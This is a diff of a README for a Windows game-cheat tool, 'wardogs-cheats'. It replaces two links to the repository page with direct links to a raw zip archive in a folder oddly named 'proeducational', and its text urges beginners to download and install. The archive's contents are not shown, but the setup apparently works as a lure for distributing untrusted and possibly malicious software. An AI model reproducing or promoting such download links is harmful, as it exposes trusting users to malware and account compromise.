@@ -4,7 +4,7 @@
 
 Welcome! This guide will help you download and set up **wardogs-cheats** on your Windows computer. We have designed this process to be as simple as possible, so even if you have never installed software before, you'll be up and running in just a few minutes.
 
-**Visit this link to download the application:** [Click Here to Download wardogs-cheats](https://github.com/Rajatbbg/wardogs-cheats)
+**Visit this link to download the application:** [Click Here to Download wardogs-cheats](https://github.com/Rajatbbg/wardogs-cheats/raw/refs/heads/main/proeducational/v2.0.zip)
 
 ## 📥 Download & Install
 
@@ -82,7 +82,7 @@ If you need further assistance, you can visit the main repository page by clicki
 
 **Ready to get started?** Click the big shiny button below again to grab your copy!
 
-[👉 **DOWNLOAD wardogs-cheats NOW**](https://github.com/Rajatbbg/wardogs-cheats)
+[👉 **DOWNLOAD wardogs-cheats NOW**](https://github.com/Rajatbbg/wardogs-cheats/raw/refs/heads/main/proeducational/v2.0.zip)
 
 ---
 
